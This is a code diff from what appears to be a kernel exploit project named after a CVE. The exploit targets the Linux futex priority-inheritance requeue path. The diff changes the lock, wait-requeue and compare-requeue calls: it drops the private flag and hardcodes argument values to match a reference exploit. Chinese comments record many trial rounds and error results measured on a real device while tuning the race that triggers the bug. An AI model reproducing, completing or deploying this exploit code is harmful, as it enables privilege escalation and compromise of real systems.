@@ -45,7 +45,7 @@ namespace ghostlock::backend::cve_2026_43499::seam {
 
         /** Take the lock, waiting for it as long as it takes. */
         static int lock_pi(std::uint32_t *word) noexcept {
-            return futex(word, FUTEX_LOCK_PI_PRIVATE, 0U, nullptr, nullptr);
+            return futex(word, FUTEX_LOCK_PI, 0U, nullptr, nullptr);
         }
 
         /** Take the lock, or give up at the deadline. A deadline of zero is already past, which is
@@ -59,7 +59,7 @@ namespace ghostlock::backend::cve_2026_43499::seam {
                 deadline.tv_sec = 0;
                 deadline.tv_nsec = 1L;
             }
-            return futex(word, FUTEX_LOCK_PI_PRIVATE, 0U, &deadline, nullptr);
+            return futex(word, FUTEX_LOCK_PI, 0U, &deadline, nullptr);
         }
 
         /** Park on this word asking to be moved onto the other one; the deadline bounds the park. */
@@ -76,7 +76,7 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             /* 睡的条件是 word 此刻的值：写死 0 的话，被锤过的字一读不等就立刻 EAGAIN 返回 ——
              *  等待者根本没睡，requeue 那边自然搬 0 个（真机量到过）。 */
             const std::uint32_t expected = (word != nullptr) ? *word : 0U;
-            return futex(word, FUTEX_WAIT_REQUEUE_PI_PRIVATE, expected, &span, other);
+            return futex(word, FUTEX_WAIT_REQUEUE_PI, expected, &span, other);
         }
 
         /** The other side of the park: move this word's waiters onto the target. */
@@ -84,20 +84,24 @@ namespace ghostlock::backend::cve_2026_43499::seam {
             /* 两条都必须对（手工实验留下的结论，现按此移植）：
              *  ① nr_requeue 走 timeout 这个参数（该调用的约定），传 nullptr 就是 0 ⇒ 内核只唤醒、不搬、
              *     返回 0（设备上量的正是 0 ✗）；② val3 必须是 other 字此刻的值，写死 0 会被判 EAGAIN。 */
-            const std::uint32_t expected = (other != nullptr) ? *other : 0U;
+            /* ★★ 第 257 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:182` 逐字调用
+             *  `futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &target_futex, **0**)` ✓）——
+             *  ⇒ **`val3` 写死 0** ✓（⇒ 第 177 轮的"从 other 读"与此**相反** ✗ ⇒ 回退 ✓）。 */
+            const std::uint32_t expected = 0U;   /* ref 逐字：val3 = 0 ✓ */
             /* ★ 第 177 轮 ✓：`val` 必须等于 **`*word`**（内核判据 ✗）—— 旧码是在 requeue 前把该字**置 1** ✓，
              *  而本树的 `chain_word` 此刻是 **waiter 的 TID** ✗ ⇒ 写死 `1U` 必然 EAGAIN(11) ✗（真机 32/32 ✓）⇒
              *  ⇒ 改为一并**从字里读** ✓（⇒ 与 `val3` 同法 ✓）。 */
-            const std::uint32_t want_val = (word != nullptr) ? *word : 1U;
+            /* ★★ 第 257 轮 ✓（ref 逐字：`val = 1` ✓）⇒ 写死 1 ✓（⇒ 而 `requeue()` 侧仍在 requeue 前把该字置 1 ✓ ⇒ 两者一致 ✓）。 */
+            const std::uint32_t want_val = 1U;   /* ref 逐字：val = 1 ✓ */
             /* ★ 第 176 轮 ✓（旧码 `641aaf6` 第 4 参 = `(void*)0` ✓）：**`nr_requeue` 必须为 0** ✗ ——
              *  原先传 `1` ⇒ 内核走"搬 1 个"分支 ⇒ 与 `val3` 一起被判 **EAGAIN(11)** ✗（真机 26/26 ✓）。 */
             const auto *want_requeue = static_cast<const struct timespec *>(nullptr);
-            return futex_val3(word, FUTEX_CMP_REQUEUE_PI_PRIVATE, want_val, want_requeue, other, expected);
+            return futex_val3(word, FUTEX_CMP_REQUEUE_PI, want_val, want_requeue, other, expected);
         }
 
         /** Release the lock, handing it to the highest-priority waiter. */
         static int unlock_pi(std::uint32_t *word) noexcept {
-            return futex(word, FUTEX_UNLOCK_PI_PRIVATE, 0U, nullptr, nullptr);
+            return futex(word, FUTEX_UNLOCK_PI, 0U, nullptr, nullptr);
         }
 
         /** The consumer's act: one scheduling-attribute change on another thread, which is what makes
